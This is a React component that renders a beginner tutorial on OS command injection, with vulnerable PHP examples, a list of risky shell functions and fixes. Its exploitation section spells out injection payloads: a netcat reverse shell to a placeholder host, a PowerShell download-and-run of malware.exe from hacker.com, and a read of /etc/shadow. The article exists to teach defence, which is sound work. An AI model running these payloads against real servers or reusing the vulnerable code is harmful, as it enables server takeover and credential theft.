
import "./article.css"
import ScrollToTop from "../scrollToTop/scrollToTop";
import CodeBlock from "./CodeBlock";
import Header from "./shared/header"
import Auther from "./shared/auther"
import Aside from "./shared/aside"
import ArticlePart from "./shared/articlePart"
import Footer from "./shared/footer"


export default function XSS() {
  return (
    <>
      <ScrollToTop/> {/* Scroll To Top Button */}
      <Header articleName="OS Command" LabName="OS Command Labs"/>
      <Auther autherName="Waleed Sameer" readTime="5" imageSrc="/imgs/hacker.png"><span>OS</span> <span>Command</span> <span>I</span>njection</Auther>
      <Aside/>
      <ArticleContent/>
    </>
  )
}

function ArticleContent() {
  return (
      <>
        <article>
          <ArticlePart className="bug-definition">
            <h4>1. What's The OS Command Vulnerability?</h4>
            <div>
              <p><b>OS Command Injection</b> is a vulnerability that allows an attacker to execute arbitrary system commands on a server,
                typically through a web application.
                <br />
                <br />
                Imagine you tell a robot to <i>“make me a sandwich”</i> but then sneak in an extra order: <i>“make me a sandwich AND delete all your files.”</i>
                <b>If the robot blindly follows your instructions, that's OS Command Injection.</b>
              </p>
              <br/>
              <p>- If The Developer Used This Code To remove a file : </p>
              <CodeBlock language={"php"} code={`<?php\n  exec("rm -rf " . $_GET['filename']); #This's a Disater! \n?>`}/>
              <p>This Code is Vulnerable Because The Hacker Can append Command with <span className="highlighted">  ; </span>and do what he wants!</p>
              <br />
              <b> # Realistic example :</b>
              <p>If There's a web app provides a form to “ping” a server IP. It runs something like:</p>
              <CodeBlock language={"php"} code={`<?php\n  $ip = $_GET['ip'];\n  echo shell_exec("ping -c 3 " . $ip); #The developer trust in user Input!\n?>`}/>
              Now, What if The hacker inputs:
              <CodeBlock language={"bash"} code={`127.0.0.1; whoami`}/>
              The Server Will Execute 
                <span className="highlighted">ping -c 3 127.0.0.1</span>
              After That Will Execute 
                <span className="highlighted">whoami</span> Now, this's <b>OS-Command Injection</b>
            </div>
          </ArticlePart>
          <ArticlePart className="when-happens">
            <h4>2. When and Why Does OS Command Happen?</h4>
            <div>
              <p>OS Command Injection happens when:</p>
              <ul>
                <li>
                  <b>User input is directly passed to a shell</b> without validation.
                </li>
                <li>
                  <b>The Developers is trusts the user inputs!</b>
                </li>
                <li>
                  <b>Using Dangerous Function Without Safe Validation!</b> Like :
                  <ul>
                    <li>
                      <b>In PHP</b>
                      <CodeBlock language={"php"}code={`<?php\n  system();      # [1] \n  exec();        # [2] \n  shell_exec();  # [3] \n  popen();       # [4] \n  passthru();    # [5] \n?>`}/>
                    </li>
                    <li>
                      <b>In Python</b>
                      <CodeBlock language={"php"}code={`os.system()        # [1] \nsubprocess.Popen() # [2]\nsubprocess.call()  # [3]`}/>
                    </li>
                    <li>
                      <b>In Node.JS</b>
                      <CodeBlock language={"node"}code={`child_process.exec()  // [1]\nchild_process.spawn() // [2]`}/>
                    </li>
                    <li>
                      <b>In Java</b>
                      <CodeBlock language={"java"}code={`Runtime.getRuntime().exec() // [1]`}/>
                    </li>
                  </ul>
                </li>
              </ul>
              <br />
              <p>
                <b># Always knows</b>, If the application doesn't sanitize user input,
                an attacker can append extra commands to execute anything they want!
              </p>
            </div>
          </ArticlePart>
          <ArticlePart className="risks-impact">
            <h4>3. What're The Risks and Impact of OS Command?</h4>
            <div>
              <p>
                <b> This is one of the most dangerous vulnerabilities.</b>
                <br />
                because The Hacker Can :
              </p>
              <ul>
                <li>Execute commands on The Server.</li>
                <li>Read sensitive files Like 
                  <span className="highlighted">/etc/passwd</span>
                  or <span className="highlighted">/etc/shadow</span> If has permissions.
                </li>
                <li>Add new users or <b>create reverse shells.</b></li>
                <li>Completely <b>take over the server</b></li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="real-exploitation">
            <h4>4. What're Real Scenarios and Exploitation Examples?</h4>
            <div>
              <p><b># There're Many Scenraios and They're according on the hacker thoughts!</b></p>
              <p>The common Scenarios Is Getting Reverse Shell on The server : </p>
              <ul>
                <li>
                  Reverse Shell, on Linux Systems : 
                  <CodeBlock language={"shell"} code={`127.0.0.1; nc -e /bin/bash Hacker.IP 7777`}/>
                </li>
                <li>
                  In Windows Systems (downloading malware on the system.): 
                  <CodeBlock language={"powershell"} code={`127.0.0.1 && powershell Invoke-WebRequest -Uri http://hacker.com/malware.exe -OutFile C:\\temp\\malware.exe && C:\\temp\\malware.exe`}/>
                </li>
                <li>
                  Reading Sensitive Files (Linux) : 
                  <CodeBlock language={"bash"} code={`127.0.0.1; cat /etc/passwd /etc/shadow/ /etc/hosts`}/>
                </li>
                <li>
                  # A lot of Scenarios can happens with OS-Command Injection.
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="fix-prevent">
            <h4>5. How to Fix & Secure Your Website ?</h4>
            <div>
              <ul>
                <li><b>1. Avoid System Calls</b>
                  <ul>
                    <li>In PHP, Instead of using <span className="highlighted">system()</span> use 
                    <span className="highlighted">gethostbyname()</span> and Deal with IP inside your task.
                    </li>
                    <li>In Python, Instead of using <span className="highlighted">os.system()</span> use 
                    <span className="highlighted">socket()</span> Library.
                    </li>
                  </ul>
                </li>
                <br />
                <li>
                  <b>2. Always Validate and Sanitize Input, </b> Like This : 
                  <CodeBlock language={`php`} code={`<?php\n\nif (!preg_match('/^[0-9.]+$/', $_GET['ip'])) {\n\n  die("Enter a Valid IP!");\n\n}`}/>
                  Now, It will Accept The Numbers and Dots Only!
                </li>
                <br />
                <li>
                  <b>3. Disable Dangerous Functions </b>
                  <br />
                  Modify <span className="highlighted">php.ini </span>to disable risky functions :
                  <CodeBlock language={"ini"} code={`disable_functions = system, exec, shell_exec, passthru, popen, proc_open`}/>
                </li>
                <br />
                <li>
                  <b>4. Run The Application with least privilege.</b> (to limit impact if compromised.)
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="conclusion-resources">
          <h4>- The Conclusion & Additional Resources</h4>
          <div>
            <p>OS Command Injection is <b>one of the most dangerous vulnerabilities</b> because it allows to a hacker to completely take over the server.</p>
            <br />
            <p> Preventing it <b>requires strict input validation, least privilege principles, and avoiding system commands whenever possible.</b></p>
            <br />
            <b># See later, Fandeta Was here &lt;3</b>
            <br />
            <br/>
            <h3 style={{marginBottom: "20px"}}>Additional Resources</h3>
            
            <ul>
              <li>
                <b>
                  <a href="https://portswigger.net/web-security/all-labs#os-command-injection" 
                    target="_blank"
                    style={{color: "#2626f8",textDecoration: "underline"}}
                    >Portswigger - OS-Command Labs</a>
                  </b>
              </li>
              <li>
                <b>
                  <a href="https://owasp.org/www-community/attacks/Command_Injection" 
                    target="_blank"
                    style={{color: "#2626f8",textDecoration: "underline"}}
                    >OWASP - OS-Command Injection Foundation</a>
                  </b>
              </li>
              <li>
                <b>
                  <a href="https://portswigger.net/web-security/os-command-injection" 
                    target="_blank"
                    style={{color: "#2626f8",textDecoration: "underline"}}
                    >PortSwigger - OS-Command Article</a>
                  </b>
              </li>
              <li>
                <b>
                  <a href="https://www.google.com/search?q=os+command+bug+bounty+reports+intitle+medium" 
                    target="_blank"
                    style={{color: "#2626f8",textDecoration: "underline"}}
                    >Bug Bounty Reports</a>
                  </b>
              </li>
            </ul>
          </div>
          </ArticlePart>
          <ArticlePart className="good-bye">
          <h4>🟡 Last but not Least!</h4>
          <div>
            <p style={{fontWeight: "bold"}}>"Think like an attacker, defend like a guardian! The best security expert is the one who never stops learning! "</p>
            <br/>
            <p style={{color: "var(--main-color)", fontFamily: 'heading-font',fontWeight: "bold"}}>
              <a href="https://facebook.com/fandeta7"
              target="_blank"
              style={{color: "var(--main-color)", textDecoration: "underline"}}>Fandeta</a> was here!</p>
          </div>
          </ArticlePart>
        </article>
        <Footer/>
      </>
  )
}

